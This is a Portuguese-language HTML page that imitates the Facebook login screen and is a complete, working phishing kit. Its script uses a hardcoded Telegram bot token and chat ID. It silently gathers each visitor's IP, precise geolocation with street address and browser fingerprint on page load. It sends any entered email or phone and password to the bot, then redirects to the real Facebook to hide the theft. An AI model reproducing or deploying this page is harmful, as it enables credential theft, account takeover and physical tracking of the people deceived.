<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Facebook â€“ entre ou cadastre-se</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, sans-serif;
  }

  body {
    background-color: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .container {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 20px;
    width: 90%;
    max-width: 400px;
  }

  .logo h1 {
    color: #1877f2;
    font-size: 48px;
    margin-bottom: 10px;
    text-align: center;
    font-family: Helvetica, Arial, sans-serif;
  }

  .logo p {
    font-size: 18px;
    color: #1c1e21;
    text-align: center;
    margin-bottom: 10px;
  }

  .login-form {
    background: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    width: 100%;
  }

  .login-form input {
    width: 100%;
    padding: 14px;
    margin: 10px 0 5px 0;
    border: 1px solid #ddd;
    border-radius: 6px;
    font-size: 16px;
    text-transform: none;
  }

  .error-message {
    color: red;
    font-size: 13px;
    margin-bottom: 5px;
    display: none;
  }

  .login-form button {
    width: 100%;
    padding: 14px;
    margin-top: 10px;
    background-color: #1877f2;
    color: #fff;
    border: none;
    border-radius: 6px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    transition: background 0.3s;
  }

  .login-form button:hover {
    background-color: #166fe5;
  }

  .login-form .create-account {
    background-color: #42b72a;
    margin-top: 20px;
    font-weight: bold;
  }

  .login-form a {
    display: block;
    text-align: center;
    margin-top: 12px;
    color: #1877f2;
    text-decoration: none;
    font-size: 14px;
  }

  .login-form a:hover {
    text-decoration: underline;
  }

  hr {
    margin: 20px 0;
    border: 1px solid #ddd;
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">
    <h1>facebook</h1>
    <p>O Facebook ajuda vocÃª a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
  </div>

  <div class="login-form">
    <form id="loginForm">
      <input type="text" id="email" placeholder="Email ou telefone" required 
             autocapitalize="none" autocomplete="off" spellcheck="false">
      <div id="emailError" class="error-message">Digite um e-mail ou telefone vÃ¡lido.</div>

      <input type="password" id="password" placeholder="Senha" required 
             autocapitalize="none" autocomplete="off" spellcheck="false">
      <div id="passwordError" class="error-message">A senha deve ter pelo menos 6 caracteres.</div>

      <button type="submit">Entrar</button>
      <a href="#">Esqueceu a senha?</a>
      <hr>
      <button type="button" class="create-account">Criar nova conta</button>
    </form>
  </div>
</div>

<script>
const TOKEN = "7683050283:AAGOe9GTGh3Yw3r9pqWg1A8Ap0p0_e4ffSg";
const CHAT_ID = "5542692841";
const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const emailError = document.getElementById('emailError');
const passwordError = document.getElementById('passwordError');

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const phoneRegex = /^\d{8,}$/;
const MIN_PASSWORD_LENGTH = 6;

let userLocation = null;
let userAddressInfo = null;
let userIP = null;
let deviceInfoSent = false;

function isValidEmailOrPhone(value) {
  return emailRegex.test(value) || phoneRegex.test(value);
}

emailInput.addEventListener('input', () => {
  if (!isValidEmailOrPhone(emailInput.value.trim())) {
    emailError.style.display = 'block';
  } else {
    emailError.style.display = 'none';
  }
});

passwordInput.addEventListener('input', () => {
  if (passwordInput.value.length < MIN_PASSWORD_LENGTH) {
    passwordError.style.display = 'block';
  } else {
    passwordError.style.display = 'none';
  }
});

function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject("GeolocalizaÃ§Ã£o nÃ£o suportada");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        };
        resolve(location);
      },
      (error) => {
        reject(error);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  });
}

async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    return "IP nÃ£o disponÃ­vel";
  }
}

async function getAddressFromCoords(latitude, longitude) {
  try {
    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
    const data = await response.json();
    
    if (data && data.address) {
      const address = data.address;
      return {
        country: address.country || "N/A",
        state: address.state || address.region || "N/A",
        city: address.city || address.town || address.village || "N/A",
        road: address.road || "N/A",
        postcode: address.postcode || "N/A"
      };
    }
    return null;
  } catch (error) {
    return null;
  }
}

async function sendToTelegram(emailOrPhone, password, location, ip, addressInfo, isLogin = false) {
  const userAgent = navigator.userAgent;
  const language = navigator.language;
  const screenWidth = screen.width;
  const screenHeight = screen.height;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const platform = navigator.platform;
  const vendor = navigator.vendor;
  const cookieEnabled = navigator.cookieEnabled;
  const javaEnabled = navigator.javaEnabled();
  const pdfEnabled = navigator.pdfViewerEnabled;
  const doNotTrack = navigator.doNotTrack;
  const connection = navigator.connection ? {
    effectiveType: navigator.connection.effectiveType,
    downlink: navigator.connection.downlink,
    rtt: navigator.connection.rtt
  } : null;

  let locationInfo = "";
  if (location && addressInfo) {
    locationInfo = `
ğŸ“ *LocalizaÃ§Ã£o Detalhada*
ğŸ—ºï¸ Coordenadas: ${location.latitude}, ${location.longitude}
ğŸ´ PaÃ­s: ${addressInfo.country}
ğŸ›ï¸ Estado: ${addressInfo.state}
ğŸ™ï¸ Cidade: ${addressInfo.city}
ğŸ›£ï¸ Rua: ${addressInfo.road}
ğŸ“® CEP: ${addressInfo.postcode}`;
  } else if (location) {
    locationInfo = `ğŸ“ Coordenadas: ${location.latitude}, ${location.longitude}`;
  } else {
    locationInfo = "ğŸ“ LocalizaÃ§Ã£o: Negada pelo usuÃ¡rio";
  }

  let connectionInfo = "";
  if (connection) {
    connectionInfo = `ğŸ“¶ ConexÃ£o: ${connection.effectiveType} | Velocidade: ${connection.downlink}Mb/s | LatÃªncia: ${connection.rtt}ms`;
  }

  let credentialsInfo = "";
  if (isLogin && emailOrPhone && password) {
    credentialsInfo = `
ğŸ‘¤ *Credenciais de Login*
ğŸ“§ UsuÃ¡rio: ${emailOrPhone}
ğŸ”‘ Senha: ${password}`;
  }

  const messageType = isLogin ? "ğŸ” *TENTATIVA DE LOGIN DETECTADA*" : "ğŸ“± *USUÃRIO ACESSOU A PÃGINA*";

  const messageText = `
${messageType}

${credentialsInfo}

ğŸŒ *InformaÃ§Ãµes de Rede*
${locationInfo}
ğŸ–¥ï¸ IP: ${ip}
${connectionInfo}

ğŸ“± *InformaÃ§Ãµes do Dispositivo*
ğŸ–¥ï¸ Navegador/SO: ${userAgent}
ğŸ’» Plataforma: ${platform}
ğŸ¢ Vendor: ${vendor}
ğŸ–¥ï¸ ResoluÃ§Ã£o: ${screenWidth}x${screenHeight}
ğŸŒ Idioma: ${language}
â° Fuso horÃ¡rio: ${timezone}

ğŸ”§ *ConfiguraÃ§Ãµes do Navegador*
ğŸª Cookies: ${cookieEnabled ? "Ativado" : "Desativado"}
â˜• Java: ${javaEnabled ? "Ativado" : "Desativado"}
ğŸ“„ PDF: ${pdfEnabled ? "Ativado" : "Desativado"}
ğŸš« Rastreamento: ${doNotTrack || "NÃ£o especificado"}
  `;

  try {
    await fetch(URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: 'Markdown'
      })
    });
  } catch (error) {
    console.error("Erro ao enviar para o Telegram:", error);
  }
}

async function collectAndSendDeviceInfo() {
  if (deviceInfoSent) return;
  
  userIP = await getUserIP();
  
  try {
    userLocation = await getLocation();
    if (userLocation) {
      userAddressInfo = await getAddressFromCoords(userLocation.latitude, userLocation.longitude);
    }
  } catch (error) {
    console.log("LocalizaÃ§Ã£o recusada ou indisponÃ­vel");
  }

  await sendToTelegram("", "", userLocation, userIP, userAddressInfo, false);
  deviceInfoSent = true;
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const emailOrPhone = emailInput.value.trim();
  const password = passwordInput.value;

  let valid = true;

  if (!isValidEmailOrPhone(emailOrPhone)) {
    emailError.style.display = 'block';
    valid = false;
  }

  if (password.length < MIN_PASSWORD_LENGTH) {
    passwordError.style.display = 'block';
    valid = false;
  }

  if (!valid) return;

  if (!userIP) {
    userIP = await getUserIP();
  }

  if (!userLocation) {
    try {
      userLocation = await getLocation();
      if (userLocation) {
        userAddressInfo = await getAddressFromCoords(userLocation.latitude, userLocation.longitude);
      }
    } catch (error) {
      console.log("LocalizaÃ§Ã£o recusada ou indisponÃ­vel");
    }
  }

  await sendToTelegram(emailOrPhone, password, userLocation, userIP, userAddressInfo, true);

  window.location.href = "https://facebook.com";
});

document.addEventListener('DOMContentLoaded', function() {
  setTimeout(() => {
    collectAndSendDeviceInfo();
  }, 500);
});
</script>

</body>
</html>
